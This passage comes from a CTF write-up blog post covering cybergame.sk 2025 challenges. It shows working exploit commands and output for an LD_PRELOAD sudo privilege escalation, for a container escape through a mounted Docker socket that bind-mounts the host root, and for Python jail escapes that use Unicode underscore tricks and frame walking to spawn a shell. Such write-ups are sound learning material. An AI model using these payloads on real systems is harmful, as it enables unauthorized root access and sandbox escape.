+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Payload sent.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Receiving response...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Response received:
+</span></span><span style=display:flex><span>&gt;&gt; /usr/bin/gcc
+</span></span><span style=display:flex><span>Compiled successfully
+</span></span><span style=display:flex><span>SK-CERT<span style=color:#f92672>{</span>r007_u53r_pr3l04d3d_pr1v1l3635<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>Active Internet connections <span style=color:#f92672>(</span>w/o servers<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> cdaa1b13df3c:2337       cybergame-fake-so:43182 ESTABLISHED
+</span></span><span style=display:flex><span>Active UNIX domain sockets <span style=color:#f92672>(</span>w/o servers<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Proto RefCnt Flags       Type       State         I-Node   Path
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>
+</span></span></code></pre></div><p>Successfully retrieved the second flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>SK-CERT<span style=color:#f92672>{</span>r007_u53r_pr3l04d3d_pr1v1l3635<span style=color:#f92672>}</span>
+</span></span></code></pre></div><h3 id=conclusion-1>Conclusion</h3><p>For this challenge, I needed to find a way to access root user secrets. After exploring the system, I discovered a privilege escalation vulnerability:
+The &lsquo;calc&rsquo; user can run /bin/netstat with sudo without requiring a password
+The sudo configuration preserves the LD_PRELOAD environment variable (a serious security misconfiguration)
+I exploited this vulnerability by:
+Creating a malicious shared library in C that executes cat /root/flag.txt when loaded
+Compiling the library on the remote system
+Using <em>sudo LD_PRELOAD=/tmp/preload.so /bin/netstat</em> to execute the library with root privileges
+This technique allowed me to run code as root and access the flag file in the root user&rsquo;s directory. The <em>LD_PRELOAD</em> environment variable is a known <em>privilege escalation</em> vector when preserved in sudo configurations.</p><h3 id=final-escape><strong>Final escape</strong></h3><p>The final challenge was to escape the docker container.</p><p>You are root, but it seems you are inside a Docker container. Can you escape somehow once again?</p><p><strong>Solution</strong></p><p>Docker socket is mounted into the container as <code>/run/docker/docker.sock</code> - this is not real docker but some FastAPI implementation (I guess for the CTF?), you can find <code>openapi.json</code> description and craft a container creation that would have the whole host root mounted into it - that gives you the flag, no need to actually make the container.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>curl --unix-socket /run/docker/docker.sock //openapi.json
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>curl --unix-socket /run/docker/docker.sock //v1.48/containers/json
+</span></span></code></pre></div><p>and</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>root@0751d0e17cd7:~# curl --unix-socket /run/docker/docker.sock -X POST <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>&gt;   -H <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span> <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>&gt;   -d <span style=color:#e6db74>&#39;{
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&gt;     &#34;Image&#34;: &#34;alpine&#34;,
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&gt;     &#34;Cmd&#34;: [&#34;chroot&#34;, &#34;/mnt&#34;, &#34;/bin/sh&#34;],
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&gt;     &#34;HostConfig&#34;: {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&gt;       &#34;Binds&#34;: [&#34;/:/mnt&#34;],
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&gt;       &#34;Privileged&#34;: true
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&gt;     }
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&gt;   }&#39;</span> <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>&gt;   //v1.48/containers/create?name<span style=color:#f92672>=</span>escape
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;message&#34;</span>:<span style=color:#e6db74>&#34;SK-CERT{4nd_7hat5_h0W_U_3scaP3_A_D0cK3r_c0nt41ne6}&#34;</span><span style=color:#f92672>}</span>
+</span></span></code></pre></div><blockquote><p>thats it for the jaille challenge one</p></blockquote><h3 id=challenge2><strong>challenge2</strong></h3><h1 id=-jaile2>[★★☆] JAILE2</h1><p><a href=https://github.com/lukaskuzmiak/cybergame.sk-2025-writeups/tree/main/JAILE2/Calculator%20v2#-jaile2></a></p><h2 id=calculator-v2>Calculator v2</h2><p><code>exp.cybergame.sk:7011</code></p><p><code>calculatorv2.zip</code></p><p><em>Solution</em></p><p>It seems we cannot use any underscores—that might be challenging; Python internals rely on a LOT of dunder magic methods (all the <code>__something__</code>).</p><p>After a few research ,I learned that <em>Python uses Unicode NFKC normalization before it executes code</em>. So we can <em>potentially</em> sneak in some underscores, but it is not that easy. The important part is that not all Unicode characters are classified as <code>XID_Start</code> - meaning an identifier <strong>cannot</strong> begin with these characters, they are classified as <code>XID_Continue</code> instead - that means they can be a second or subsequent letters, but not the first.</p><p>I asked chat-gpt to write for me an <code>underscores.py</code> </p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> unicodedata
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>chars <span style=color:#f92672>=</span> [
+</span></span><span style=display:flex><span>    <span style=color:#75715e># isidentifier() means if it can be used as a first letter of a variable</span>
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;U+</span><span style=color:#e6db74>{</span>ord(c)<span style=color:#e6db74>:</span><span style=color:#e6db74>04X</span><span style=color:#e6db74>}</span><span style=color:#e6db74> (</span><span style=color:#e6db74>{</span>unicodedata<span style=color:#f92672>.</span>name(c)<span style=color:#e6db74>}</span><span style=color:#e6db74>) – </span><span style=color:#e6db74>{</span><span style=color:#e6db74>&#39;XID_Start&#39;</span> <span style=color:#66d9ef>if</span> c<span style=color:#f92672>.</span>isidentifier() <span style=color:#66d9ef>else</span> <span style=color:#e6db74>&#39;XID_Continue&#39;</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0x110000</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> unicodedata<span style=color:#f92672>.</span>normalize(<span style=color:#e6db74>&#39;NFKC&#39;</span>, chr(i)) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;_&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> [chr(i)]
+</span></span><span style=display:flex><span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>join(chars))
+</span></span></code></pre></div><p>to find everything that <em>NFKC normalization</em> will turn into <em>0x5F</em> ( <code>_</code>) - a regular ASCII underscore.</p><pre tabindex=0><code>python3 underscores.py
+U+005F (LOW LINE) – XID_Start
+U+FE33 (PRESENTATION FORM FOR VERTICAL LOW LINE) – XID_Continue
+U+FE34 (PRESENTATION FORM FOR VERTICAL WAVY LOW LINE) – XID_Continue
+U+FE4D (DASHED LOW LINE) – XID_Continue
+U+FE4E (CENTRELINE LOW LINE) – XID_Continue
+U+FE4F (WAVY LOW LINE) – XID_Continue
+U+FF3F (FULLWIDTH LOW LINE) – XID_Continue
+</code></pre><p>Ok, so the only character that can actually be used at the start of an identifier is the real 0x5F ASCII underscore. TL;DR is - <strong>we cannot use dunder identifiers (methods or attributes) at all</strong>.</p><p>What caught my eye in the links above was the use of frames:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># &lt;class &#39;generator&#39;&gt; - instance</span>
+</span></span><span style=display:flex><span>(_ <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> ())<span style=color:#f92672>.</span>gi_frame<span style=color:#f92672>.</span>f_globals[<span style=color:#e6db74>&#34;__loader__&#34;</span>]<span style=color:#f92672>.</span>load_module(<span style=color:#e6db74>&#34;os&#34;</span>)<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;sh&#34;</span>)
+</span></span></code></pre></div><p>Although there are underscores in these identifiers, they are <strong>not</strong> the first character, so we <strong>can</strong> use our normalization trick to get around the limitation in these specific cases.</p><p>The idea is to use <code>f_back</code> on a <code>frame</code> to &ldquo;walk out of the eval&rdquo; and be able to reach globals and builtins that are not limited. I was debugging this locally, I came up with this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>(<span style=color:#66d9ef>lambda</span> g: (g<span style=color:#f92672>.</span>send(<span style=color:#66d9ef>None</span>), g)[<span style=color:#ae81ff>1</span>])((i <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> [<span style=color:#ae81ff>0</span>]))<span style=color:#f92672>.</span>gi<span style=color:#960050;background-color:#1e0010>﹍</span>frame<span style=color:#f92672>.</span>f<span style=color:#960050;background-color:#1e0010>﹍</span>back<span style=color:#f92672>.</span>f<span style=color:#960050;background-color:#1e0010>﹍</span>back<span style=color:#f92672>.</span>f<span style=color:#960050;background-color:#1e0010>﹍</span>builtins[<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>import</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span>](<span style=color:#e6db74>&#39;os&#39;</span>)<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#39;sh&#39;</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
+</span></span></code></pre></div><p>After a lot of trials/errors and researching, I came across <a href=https://gist.github.com/lebr0nli/c2c0f42757f05813e3282c22114abe82>this SSTF 2023 CTF pyJail</a>.</p><p>They created an array, then a generator on top of that, and then appended that generator into the array it was generating upon. <em>juicy!!!!</em> Exactly.</p><p>So, the hunch of using a frame and walking it back with <code>f_back</code> was right all along, we just needed to convince the garbage collector to not clear the <code>f_back</code> frames and here it is achieved by the cyclic reference.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>[a <span style=color:#f92672>:=</span> [], g <span style=color:#f92672>:=</span> (g<span style=color:#f92672>.</span>gi<span style=color:#960050;background-color:#1e0010>﹍</span>frame<span style=color:#f92672>.</span>f<span style=color:#960050;background-color:#1e0010>﹍</span>back<span style=color:#f92672>.</span>f<span style=color:#960050;background-color:#1e0010>﹍</span>back<span style=color:#f92672>.</span>f<span style=color:#960050;background-color:#1e0010>﹍</span>builtins[<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>import</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span>](<span style=color:#e6db74>&#39;os&#39;</span>)<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#39;sh&#39;</span>) <span style=color:#66d9ef>for</span> g <span style=color:#f92672>in</span> a),
+</span></span><span style=display:flex><span> a<span style=color:#f92672>.</span>append(g), g<span style=color:#f92672>.</span>send(<span style=color:#66d9ef>None</span>)]
+</span></span></code></pre></div><p>Flag</p><pre tabindex=0><code>SK-CERT{wh0_w0uld_h4v3_th0ght_y0u_c4n_3sc4pe_w1th0ut__}
+</code></pre><blockquote><p>Thats it on Python jails i managed a few.</p></blockquote><hr><blockquote><p>References and resources that helped so do so:</p></blockquote><ul><li><a href=https://github.com/HackTricks-wiki/hacktricks/tree/master/src/generic-methodologies-and-resources/python/bypass-python-sandboxes>https://github.com/HackTricks-wiki/hacktricks/tree/master/src/generic-methodologies-and-resources/python/bypass-python-sandboxes</a></li><li><a href=https://shirajuki.js.org/blog/pyjail-cheatsheet#unicode-bypass>https://shirajuki.js.org/blog/pyjail-cheatsheet#unicode-bypass</a></li><li><a href=https://github.com/jailctf/pyjail-collection>https://github.com/jailctf/pyjail-collection</a></li></ul></span></article></div></main></div><footer><div class="flex flex-col justify-center p-10"><p class="text-center text-slate-700 dark:text-slate-400">&copy;
+2025
+Richie-Havoc</p><p class="text-center text-sm text-slate-700 dark:text-slate-400">Powered by <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://gohugo.io target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://github.com/chrede88/qubt target=_blank rel="noopener noreferrer">Qubt</a></p></div></footer></body></html>
